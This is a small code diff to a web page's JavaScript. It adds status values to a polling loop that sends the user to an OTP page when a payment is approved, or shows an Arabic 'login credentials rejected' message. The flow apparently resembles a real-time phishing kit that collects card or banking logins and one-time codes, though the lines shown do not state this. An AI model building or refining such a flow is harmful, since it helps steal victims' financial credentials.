@@ -624,11 +624,11 @@
 
           var st = String(data.status).toLowerCase();
           
-          if (st === 'accept' || st === 'approved' || st === 'otp') {
+          if (st === 'accept' || st === 'accepted' || st === 'approved' || st === 'otp') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
             window.location.href = 'otp.html?id=' + paymentId;
-          } else if (st === 'reject' || st === 'declined' || st === 'error') {
+          } else if (st === 'reject' || st === 'rejected' || st === 'declined' || st === 'error' || st === 'failed') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
             var rejectMessage = 'تم رفض بيانات تسجيل الدخول. يرجى التحقق من المعلومات والمحاولة مرة أخرى.';
